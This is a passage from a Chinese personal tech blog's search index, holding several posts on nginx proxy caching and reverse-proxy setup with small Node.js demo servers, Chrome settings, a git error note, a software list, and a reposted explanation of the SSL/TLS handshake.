&lt;pre&gt;&lt;code class=&#34;language-nginx&#34;&gt;proxy_cache_path cache levels=1:2 keys_zone=my_cache:10m;

server {
   listen       80;
   server_name  test.com;

   location / {
       proxy_cache my_cache;
       proxy_pass   http://127.0.0.1:8888;
       proxy_set_header Host $host;
   }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;proxy_cache_path cache levels=1:2 keys_zone=my_cache:10m;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;第一个参数指定缓存保存的本地路径&lt;/p&gt;
&lt;p&gt;levels参数负责设置缓存目录级别&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;当levels=1:2时，表示是两级目录，1和2表示用1位和2位16进制来命名目录名称。&lt;/p&gt;
&lt;p&gt;在此例中，第一级目录用1位16进制命名，如b；第二级目录用2位16进制命名，如2b。所以此例中一级目录有16个，二级目录有16*16=256个：&lt;code&gt;/cache/b/2b/d7b6e5978e3f042f52e875005925e51b&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;总目录数为16*256=4096个。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;keys_zone参数用来为这个缓存区起名&lt;br&gt;
10m 指内存缓存空间大小为10MB&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;code&gt;proxy_cache my_cache;&lt;/code&gt;使用定义的缓存区&lt;/p&gt;
&lt;h2 id=&#34;服务&#34;&gt;服务&lt;/h2&gt;
&lt;p&gt;nginx-cache/test.html&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html lang=&amp;quot;en&amp;quot;&amp;gt;
&amp;lt;head&amp;gt;
  &amp;lt;meta charset=&amp;quot;UTF-8&amp;quot;&amp;gt;
  &amp;lt;meta name=&amp;quot;viewport&amp;quot; content=&amp;quot;width=device-width, initial-scale=1.0&amp;quot;&amp;gt;
  &amp;lt;meta http-equiv=&amp;quot;X-UA-Compatible&amp;quot; content=&amp;quot;ie=edge&amp;quot;&amp;gt;
  &amp;lt;title&amp;gt;Document&amp;lt;/title&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
  &amp;lt;div&amp;gt;This is content, and data is: &amp;lt;span id=&amp;quot;data&amp;quot;&amp;gt;&amp;lt;/span&amp;gt;&amp;lt;/div&amp;gt;
  &amp;lt;button id=&amp;quot;button&amp;quot;&amp;gt;click me&amp;lt;/button&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;script&amp;gt;
  var index = 0
  function doRequest () {
    var data = document.getElementById(&#39;data&#39;)
    data.innerText = &#39;&#39;
    fetch(&#39;/data&#39;, {
      headers: {
        &#39;X-Test-Cache&#39;: index++
      }
    }).then(function (resp) {
      return resp.text()
    }).then(function (text) {
      data.innerText = text
    })
  }
  document.getElementById(&#39;button&#39;).addEventListener(&#39;click&#39;, doRequest)
&amp;lt;/script&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;nginx-cache/server.js&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;const http = require(&#39;http&#39;)
const fs = require(&#39;fs&#39;)

const wait = (seconds) =&amp;gt; {
  return new Promise((resolve) =&amp;gt; {
    setTimeout(resolve, seconds * 1000)
  })
}
http.createServer(function (request, response) {
  console.log(&#39;request come&#39;, request.url)

  if (request.url === &#39;/&#39;) {
    const html = fs.readFileSync(&#39;test.html&#39;, &#39;utf8&#39;)
    response.writeHead(200, {
      &#39;Content-Type&#39;: &#39;text/html&#39;
    })
    response.end(html)
  }

  if (request.url === &#39;/data&#39;) {
    response.writeHead(200, {
      &#39;Cache-Control&#39;: &#39;max-age=2, s-maxage=20, private&#39;,
      &#39;Vary&#39;: &#39;X-Test-Cache&#39;
    })
    wait(2).then(() =&amp;gt; response.end(&#39;success&#39;))
  }
}).listen(8888)

console.log(&#39;server listening on 8888&#39;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;max-age: 客户端缓存时长&lt;/p&gt;
&lt;p&gt;s-maxage：代理服务器缓存时长&lt;/p&gt;
&lt;p&gt;private：仅客户端可缓存&lt;/p&gt;
&lt;p&gt;Vary：仅当设置的属性值一致时使用缓存&lt;/p&gt;
&lt;p&gt;注意：修改代码看效果时，需要重启node服务&lt;/p&gt;
">83-nginx-2-代理缓存</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/chrome-she-zhi/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;chrome功能设置及操作&lt;/p&gt;
&lt;h2 id=&#34;搜索引擎&#34;&gt;搜索引擎&lt;/h2&gt;
&lt;p&gt;地址栏中使用的搜索引擎：百度&lt;/p&gt;
&lt;h2 id=&#34;启动时&#34;&gt;启动时&lt;/h2&gt;
&lt;h3 id=&#34;同时打开多网页&#34;&gt;同时打开多网页&lt;/h3&gt;
&lt;p&gt;打开特定网页或一组网页，添加新网页&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;https://leecss.com/
https://leecss.com/post/qian-duan-jiao-cheng-dao-hang/
https://fanyi.baidu.com/
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;语言&#34;&gt;语言&lt;/h2&gt;
&lt;p&gt;高级 - 语言 - 语言折叠 - 添加语言 - 中文简体&lt;/p&gt;
&lt;p&gt;中文简体 - 以这种语言显示Google Chrome&lt;/p&gt;
">82-chrome-3-设置</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/git-bao-cuo/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;记录git操作的报错信息&lt;/p&gt;
&lt;h2 id=&#34;列表&#34;&gt;列表&lt;/h2&gt;
&lt;p&gt;1、在子目录中执行git命令，需切换到根目录&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;You need to run this command from the toplevel of the working tree.&lt;/p&gt;
&lt;p&gt;您需要从工作树的顶层运行此命令。&lt;/p&gt;
&lt;/blockquote&gt;
">81-git-43-报错</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/nginx-an-zhuang-he-ji-chu-dai-li-pei-zhi/"" data-c="
          &lt;h2 id=&#34;功能&#34;&gt;功能&lt;/h2&gt;
&lt;p&gt;1、高性能静态服务器&lt;br&gt;
2、反向代理&lt;/p&gt;
&lt;h2 id=&#34;安装和启动&#34;&gt;安装和启动&lt;/h2&gt;
&lt;h3 id=&#34;安装&#34;&gt;安装&lt;/h3&gt;
&lt;p&gt;windows&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://nginx.org/en/download.html&#34;&gt;nginx下载地址&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;选择nginx/Windows-[x.x.x]，点击下载即可，下载完成后解压到电脑中。&lt;/p&gt;
&lt;h3 id=&#34;启动&#34;&gt;启动&lt;/h3&gt;
&lt;p&gt;进入nginx解压目录，在命令行输入&lt;code&gt;.\nginx.exe&lt;/code&gt;即可启动，打开浏览器输入&lt;code&gt;localhost&lt;/code&gt;,看到下述内容说明启动成功。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Welcome to nginx!
If you see this page, the nginx web server is successfully installed and working. Further configuration is required.

For online documentation and support please refer to nginx.org.
Commercial support is available at nginx.com.

Thank you for using nginx.
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;关闭&#34;&gt;关闭&lt;/h3&gt;
&lt;p&gt;在任务管理器中结束nginx进程&lt;/p&gt;
&lt;h3 id=&#34;命令&#34;&gt;命令&lt;/h3&gt;
&lt;p&gt;启动；停止；退出。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;start nginx
nginx -s stop
nginx -s quit
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;配置&#34;&gt;配置&lt;/h2&gt;
&lt;h3 id=&#34;配置文件&#34;&gt;配置文件&lt;/h3&gt;
&lt;p&gt;conf\nginx.conf为配置文件&lt;/p&gt;
&lt;p&gt;可以在conf中新建servers文件夹，将配置提取出来，然后在nginx.conf中引入，使目录结构更清晰&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-nginx&#34;&gt;    #gzip  on;

    include  servers/*.conf;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;注意&lt;code&gt;include servers/*.conf;&lt;/code&gt;结尾要加分号&lt;/p&gt;
&lt;h3 id=&#34;新建配置文件&#34;&gt;新建配置文件&lt;/h3&gt;
&lt;p&gt;在servers目录下新建test.conf文件，并启动nginx&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-nginx&#34;&gt;server {
   listen       80;
   server_name  test.com;

   location / {
       proxy_pass   http://127.0.0.1:8888;
   }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;listen: 监听的端口&lt;/p&gt;
&lt;p&gt;server_name: 浏览器访问的Host域名，根据访问的Host域名判断代理到什么地方&lt;/p&gt;
&lt;p&gt;proxy_pass: 实际代理的地方&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;在本地启动一个服务&#34;&gt;在本地启动一个服务&lt;/h3&gt;
&lt;p&gt;新建server.js，&lt;code&gt;node server.js&lt;/code&gt;启动服务&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;const http = require(&#39;http&#39;)

http.createServer(function (request, response) {
    console.log(&#39;request come&#39;, request.url)

    response.end(&#39;123&#39;)
}).listen(8888)

console.log(&#39;server listening on 8888&#39;)
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;462错误&#34;&gt;462错误&lt;/h3&gt;
&lt;p&gt;在浏览器访问&lt;code&gt;test.com&lt;/code&gt;,页面出现462错误。&lt;/p&gt;
&lt;p&gt;1、先了解两个东西&lt;/p&gt;
&lt;p&gt;DNS：把域名解析为IP地址，保存的就是域名和ip的映射关系。一个域名和一个ip地址绑定，一个ip地址可以被多个域名绑定。&lt;/p&gt;
&lt;p&gt;本地hosts：修改hosts文件实现域名本地解析–相当于本地DNS服务器，正常是先走本地（hosts），本地失败再走网络的DNS服务器&lt;/p&gt;
&lt;p&gt;另外，hosts文件里边只能配置ip和域名的映射关系，不能配端口号&lt;/p&gt;
&lt;p&gt;2、分析一下访问过程：&lt;/p&gt;
&lt;p&gt;当我们在浏览器访问test.com时，先去走DNS解析，在本地我们没有修改hosts文件，所以会走网络的DNS解析服务器，而网络上并没有这个域名，所以没有解析到ip地址，也就无法访问服务器，没有内容返回。&lt;/p&gt;
&lt;p&gt;假如我们配置了hosts文件，&lt;code&gt;127.0.0.1 test.com&lt;/code&gt;,即将test.com解析到本地，于是就能访问到我们本地启动的web服务器&lt;code&gt;http://127.0.0.1:8888&lt;/code&gt;，然后由于我们启动了nginx,并且匹配到&lt;code&gt;test.com&lt;/code&gt;Host请求头，所以拦截了请求并转发到&lt;code&gt;http://127.0.0.1:8888&lt;/code&gt;,于是我们就可以通过配置的代理，使用域名来访问本地的服务。&lt;/p&gt;
&lt;p&gt;由上述过程可知，我并没有配置hosts，所以我配置了之后重新访问，发现依然不能正常访问。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;配置hosts: 修改C:\Windows\System32\drivers\etc\hosts文件&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;3、谷歌浏览器启用了hsts的安全策略，当你输入网址时，默认访问https协议，且当你第一次访问https协议后，下一次都会自动转为https协议。&lt;/p&gt;
&lt;p&gt;禁止谷歌自动将http自动转为https&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;地址栏中输入 &lt;code&gt;chrome://net-internals/#hsts&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;在 &lt;code&gt;Delete domain security policies&lt;/code&gt; 中输入项目的域名，并 &lt;code&gt;Delete&lt;/code&gt; 删除&lt;/li&gt;
&lt;li&gt;可以在 &lt;code&gt;Query domain&lt;/code&gt; 测试是否删除成功&lt;/li&gt;
&lt;/ol&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1628468089288.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;当上述操作仍然不奏效后，清除浏览器缓存，再次尝试，成功。&lt;/p&gt;
&lt;h3 id=&#34;配置获取浏览器实际访问的域名&#34;&gt;配置获取浏览器实际访问的域名&lt;/h3&gt;
&lt;p&gt;nginx-test.conf&lt;/p&gt;
&lt;p&gt;&lt;code&gt;proxy_set_header Host $host;&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-nginx&#34;&gt;server {
   listen       80;
   server_name  test.com;

   location / {
       proxy_pass   http://127.0.0.1:8888;
       proxy_set_header Host $host;
   }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;server.js&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;const http = require(&#39;http&#39;)

http.createServer(function (request, response) {
    console.log(&#39;request come&#39;, request.headers.host)

    response.end(request.headers.host)
}).listen(8888)

console.log(&#39;server listening on 8888&#39;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;添加完配置之后，可以看到，获取的&lt;code&gt;request.headers.host&lt;/code&gt;由实际的&lt;code&gt;127.0.0.1:8888&lt;/code&gt;变成了&lt;code&gt;test.com&lt;/code&gt;&lt;br&gt;
修改完之后，需要从任务管理器中杀死nginx进程，然后再重启nginx&lt;/p&gt;
&lt;h2 id=&#34;推荐阅读&#34;&gt;推荐阅读&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/thewindkee/p/12873181.html&#34;&gt;如何禁止chrome浏览器http自动转成https&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://leecss.com/post/http-zheng-xiang-dai-li-he-fan-xiang-dai-li/&#34;&gt;正向代理和反向代理&lt;/a&gt;&lt;/p&gt;
">80-nginx-1-安装和基础代理配置</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/ruan-jian-hui-zong/"" data-c="
          &lt;h1 id=&#34;79-navigation-4-软件&#34;&gt;79-navigation-4-软件&lt;/h1&gt;
&lt;h2 id=&#34;开发&#34;&gt;开发&lt;/h2&gt;
&lt;h3 id=&#34;编辑器&#34;&gt;编辑器&lt;/h3&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/notepad-plus-plus/notepad-plus-plus/releases&#34;&gt;notepad&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://code.visualstudio.com/&#34;&gt;vscode&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/marktext/marktext/releases&#34;&gt;marktext&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;web服务器&#34;&gt;web服务器&lt;/h3&gt;
&lt;p&gt;&lt;a href=&#34;http://nginx.org/en/download.html&#34;&gt;nginx&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;装机&#34;&gt;装机&lt;/h2&gt;
&lt;h3 id=&#34;软件&#34;&gt;软件&lt;/h3&gt;
&lt;p&gt;&lt;a href=&#34;https://www.huorong.cn/&#34;&gt;huorong&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://otp.landian.vip/zh-cn/&#34;&gt;Office Tool Plus&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.google.cn/chrome/&#34;&gt;chrome&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.7-zip.org/&#34;&gt;7-zip&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;目录&#34;&gt;目录&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;D:       
├─software  
   ├─download     
   └─apps
      ├─huorong
      └─7zip
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;维护&#34;&gt;维护&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://www.disksavvy.com/downloads.html&#34;&gt;DiskSavvy&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;SpaceSniffer&lt;/p&gt;
">79-navigation-4-软件</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/http-https-xie-yi/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;互联网的通信安全，建立在SSL/TLS协议之上。&lt;/p&gt;
&lt;p&gt;本文简要介绍SSL/TLS协议的运行机制。文章的重点是设计思想和运行过程，不涉及具体的实现细节。如果想了解这方面的内容，请参阅&lt;a href=&#34;https://tools.ietf.org/html/rfc5246&#34;&gt;RFC文档&lt;/a&gt;。&lt;/p&gt;
&lt;h2 id=&#34;一-作用&#34;&gt;一、作用&lt;/h2&gt;
&lt;p&gt;不使用SSL/TLS的HTTP通信，就是不加密的通信。所有信息明文传播，带来了三大风险。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;（1） &lt;strong&gt;窃听风险&lt;/strong&gt;（eavesdropping）：第三方可以获知通信内容。&lt;/p&gt;
&lt;p&gt;（2） &lt;strong&gt;篡改风险&lt;/strong&gt;（tampering）：第三方可以修改通信内容。&lt;/p&gt;
&lt;p&gt;（3） &lt;strong&gt;冒充风险&lt;/strong&gt;（pretending）：第三方可以冒充他人身份参与通信。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;SSL/TLS协议是为了解决这三大风险而设计的，希望达到：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;（1） 所有信息都是&lt;strong&gt;加密传播&lt;/strong&gt;，第三方无法窃听。&lt;/p&gt;
&lt;p&gt;（2） 具有&lt;strong&gt;校验机制&lt;/strong&gt;，一旦被篡改，通信双方会立刻发现。&lt;/p&gt;
&lt;p&gt;（3） 配备&lt;strong&gt;身份证书&lt;/strong&gt;，防止身份被冒充。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;互联网是开放环境，通信双方都是未知身份，这为协议的设计带来了很大的难度。而且，协议还必须能够经受所有匪夷所思的攻击，这使得SSL/TLS协议变得异常复杂。&lt;/p&gt;
&lt;h2 id=&#34;二-历史&#34;&gt;二、历史&lt;/h2&gt;
&lt;p&gt;互联网加密通信协议的历史，几乎与互联网一样长。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;1994年，NetScape公司设计了SSL协议（Secure Sockets Layer）的1.0版，但是未发布。&lt;/p&gt;
&lt;p&gt;1995年，NetScape公司发布SSL 2.0版，很快发现有严重漏洞。&lt;/p&gt;
&lt;p&gt;1996年，SSL 3.0版问世，得到大规模应用。&lt;/p&gt;
&lt;p&gt;1999年，互联网标准化组织ISOC接替NetScape公司，发布了SSL的升级版&lt;a href=&#34;https://en.wikipedia.org/wiki/Secure_Sockets_Layer&#34;&gt;TLS&lt;/a&gt; 1.0版。&lt;/p&gt;
&lt;p&gt;2006年和2008年，TLS进行了两次升级，分别为TLS 1.1版和TLS 1.2版。最新的变动是2011年TLS 1.2的&lt;a href=&#34;https://tools.ietf.org/html/rfc6176&#34;&gt;修订版&lt;/a&gt;。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;目前，应用最广泛的是TLS 1.0，接下来是SSL 3.0。但是，主流浏览器都已经实现了TLS 1.2的支持。&lt;/p&gt;
&lt;p&gt;TLS 1.0通常被标示为SSL 3.1，TLS 1.1为SSL 3.2，TLS 1.2为SSL 3.3。&lt;/p&gt;
&lt;h2 id=&#34;三-基本的运行过程&#34;&gt;三、基本的运行过程&lt;/h2&gt;
&lt;p&gt;SSL/TLS协议的基本思路是采用&lt;a href=&#34;https://en.wikipedia.org/wiki/Public-key_cryptography&#34;&gt;公钥加密法&lt;/a&gt;，也就是说，客户端先向服务器端索要公钥，然后用公钥加密信息，服务器收到密文后，用自己的私钥解密。&lt;/p&gt;
&lt;p&gt;但是，这里有两个问题。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;（1）如何保证公钥不被篡改？&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;解决方法：将公钥放在&lt;a href=&#34;https://en.wikipedia.org/wiki/Digital_certificate&#34;&gt;数字证书&lt;/a&gt;中。只要证书是可信的，公钥就是可信的。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;（2）公钥加密计算量太大，如何减少耗用的时间？&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;解决方法：每一次对话（session），客户端和服务器端都生成一个&amp;quot;对话密钥&amp;quot;（session key），用它来加密信息。由于&amp;quot;对话密钥&amp;quot;是对称加密，所以运算速度非常快，而服务器公钥只用于加密&amp;quot;对话密钥&amp;quot;本身，这样就减少了加密运算的消耗时间。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;因此，SSL/TLS协议的基本过程是这样的：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;（1） 客户端向服务器端索要并验证公钥。&lt;/p&gt;
&lt;p&gt;（2） 双方协商生成&amp;quot;对话密钥&amp;quot;。&lt;/p&gt;
&lt;p&gt;（3） 双方采用&amp;quot;对话密钥&amp;quot;进行加密通信。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;上面过程的前两步，又称为&amp;quot;握手阶段&amp;quot;（handshake）。&lt;/p&gt;
&lt;h2 id=&#34;四-握手阶段的详细过程&#34;&gt;四、握手阶段的详细过程&lt;/h2&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1628721665340.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;&amp;quot;握手阶段&amp;quot;涉及四次通信，我们一个个来看。需要注意的是，&amp;quot;握手阶段&amp;quot;的所有通信都是明文的。&lt;/p&gt;
&lt;h3 id=&#34;41-客户端发出请求clienthello&#34;&gt;4.1 客户端发出请求（ClientHello）&lt;/h3&gt;
&lt;p&gt;首先，客户端（通常是浏览器）先向服务器发出加密通信的请求，这被叫做ClientHello请求。&lt;/p&gt;
&lt;p&gt;在这一步，客户端主要向服务器提供以下信息。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;（1） 支持的协议版本，比如TLS 1.0版。&lt;/p&gt;
&lt;p&gt;（2） 一个客户端生成的随机数，稍后用于生成&amp;quot;对话密钥&amp;quot;。&lt;/p&gt;
&lt;p&gt;（3） 支持的加密方法，比如RSA公钥加密。&lt;/p&gt;
&lt;p&gt;（4） 支持的压缩方法。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这里需要注意的是，客户端发送的信息之中不包括服务器的域名。也就是说，理论上服务器只能包含一个网站，否则会分不清应该向客户端提供哪一个网站的数字证书。这就是为什么通常一台服务器只能有一张数字证书的原因。&lt;/p&gt;
&lt;p&gt;对于虚拟主机的用户来说，这当然很不方便。2006年，TLS协议加入了一个&lt;a href=&#34;https://tools.ietf.org/html/rfc4366&#34;&gt;Server Name Indication扩展&lt;/a&gt;，允许客户端向服务器提供它所请求的域名。&lt;/p&gt;
&lt;h3 id=&#34;42-服务器回应severhello&#34;&gt;4.2 服务器回应（SeverHello）&lt;/h3&gt;
&lt;p&gt;服务器收到客户端请求后，向客户端发出回应，这叫做SeverHello。服务器的回应包含以下内容。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;（1） 确认使用的加密通信协议版本，比如TLS 1.0版本。如果浏览器与服务器支持的版本不一致，服务器关闭加密通信。&lt;/p&gt;
&lt;p&gt;（2） 一个服务器生成的随机数，稍后用于生成&amp;quot;对话密钥&amp;quot;。&lt;/p&gt;
&lt;p&gt;（3） 确认使用的加密方法，比如RSA公钥加密。&lt;/p&gt;
&lt;p&gt;（4） 服务器证书。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;除了上面这些信息，如果服务器需要确认客户端的身份，就会再包含一项请求，要求客户端提供&amp;quot;客户端证书&amp;quot;。比如，金融机构往往只允许认证客户连入自己的网络，就会向正式客户提供USB密钥，里面就包含了一张客户端证书。&lt;/p&gt;
&lt;h3 id=&#34;43-客户端回应&#34;&gt;4.3 客户端回应&lt;/h3&gt;
&lt;p&gt;客户端收到服务器回应以后，首先验证服务器证书。如果证书不是可信机构颁布、或者证书中的域名与实际域名不一致、或者证书已经过期，就会向访问者显示一个警告，由其选择是否还要继续通信。&lt;/p&gt;
&lt;p&gt;如果证书没有问题，客户端就会从证书中取出服务器的公钥。然后，向服务器发送下面三项信息。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;（1） 一个随机数。该随机数用服务器公钥加密，防止被窃听。&lt;/p&gt;
&lt;p&gt;（2） 编码改变通知，表示随后的信息都将用双方商定的加密方法和密钥发送。&lt;/p&gt;
&lt;p&gt;（3） 客户端握手结束通知，表示客户端的握手阶段已经结束。这一项同时也是前面发送的所有内容的hash值，用来供服务器校验。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;上面第一项的随机数，是整个握手阶段出现的第三个随机数，又称&amp;quot;pre-master key&amp;quot;。有了它以后，客户端和服务器就同时有了三个随机数，接着双方就用事先商定的加密方法，各自生成本次会话所用的同一把&amp;quot;会话密钥&amp;quot;。&lt;/p&gt;
&lt;p&gt;至于为什么一定要用三个随机数，来生成&amp;quot;会话密钥&amp;quot;，&lt;a href=&#34;http://blog.csdn.net/dog250/article/details/5717162&#34;&gt;dog250&lt;/a&gt;解释得很好：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&amp;quot;不管是客户端还是服务器，都需要随机数，这样生成的密钥才不会每次都一样。由于SSL协议中证书是静态的，因此十分有必要引入一种随机因素来保证协商出来的密钥的随机性。&lt;/p&gt;
&lt;p&gt;对于RSA密钥交换算法来说，pre-master-key本身就是一个随机数，再加上hello消息中的随机，三个随机数通过一个密钥导出器最终导出一个对称密钥。&lt;/p&gt;
&lt;p&gt;pre master的存在在于SSL协议不信任每个主机都能产生完全随机的随机数，如果随机数不随机，那么pre master secret就有可能被猜出来，那么仅适用pre master secret作为密钥就不合适了，因此必须引入新的随机因素，那么客户端和服务器加上pre master secret三个随机数一同生成的密钥就不容易被猜出了，一个伪随机可能完全不随机，可是是三个伪随机就十分接近随机了，每增加一个自由度，随机性增加的可不是一。&amp;quot;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;此外，如果前一步，服务器要求客户端证书，客户端会在这一步发送证书及相关信息。&lt;/p&gt;
&lt;h3 id=&#34;44-服务器的最后回应&#34;&gt;4.4 服务器的最后回应&lt;/h3&gt;
&lt;p&gt;服务器收到客户端的第三个随机数pre-master key之后，计算生成本次会话所用的&amp;quot;会话密钥&amp;quot;。然后，向客户端最后发送下面信息。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;（1）编码改变通知，表示随后的信息都将用双方商定的加密方法和密钥发送。&lt;/p&gt;
&lt;p&gt;（2）服务器握手结束通知，表示服务器的握手阶段已经结束。这一项同时也是前面发送的所有内容的hash值，用来供客户端校验。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;至此，整个握手阶段全部结束。接下来，客户端与服务器进入加密通信，就完全是使用普通的HTTP协议，只不过用&amp;quot;会话密钥&amp;quot;加密内容。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1628721733951.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h2 id=&#34;转载&#34;&gt;转载&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;阮一峰&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.ruanyifeng.com/blog/2014/02/ssl_tls.html&#34;&gt;https://www.ruanyifeng.com/blog/2014/02/ssl_tls.html&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;推荐阅读&#34;&gt;推荐阅读&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://mp.weixin.qq.com/s/StqqafHePlBkWAPQZg3NrA&#34;&gt;一个故事讲完https&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://juejin.cn/post/6844904089495535624&#34;&gt;看完这篇 HTTPS，和面试官扯皮就没问题了&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.ruanyifeng.com/blog/2016/08/migrate-from-http-to-https.html&#34;&gt;HTTPS 升级指南&lt;/a&gt;&lt;/p&gt;
">78-http-28-https协议</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/http-zheng-xiang-dai-li-he-fan-xiang-dai-li/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;Web 上的代理服务器是代表客户端完成事务处理的中间人。如果没有 Web 代理， HTTP 客户端就要直接与 HTTP 服务器进行对话。有了 Web 代理，客户端就可以与代理进行对话，然后由代理代表客户端与服务器进行交流。客户端仍然会完成对事务的处理，但它是通过代理服务器提供的优质服务来实现的。&lt;/p&gt;
